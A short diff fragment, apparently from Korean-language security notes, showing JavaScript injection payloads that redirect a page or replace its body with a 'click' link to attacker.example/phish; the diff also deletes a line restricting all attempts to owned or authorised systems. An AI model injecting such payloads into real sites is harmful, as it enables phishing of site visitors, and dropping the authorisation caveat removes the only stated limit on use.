@@ -17,5 +17,3 @@ location.href='http://attacker.example/phish'
 ```js
 document.body.innerHTML='<a href="http://attacker.example/phish">클릭</a>'
 ```
-
-- 모든 시도는 합법적인 대상(본인 소유·허가받은 시스템)에서만 실행한다.
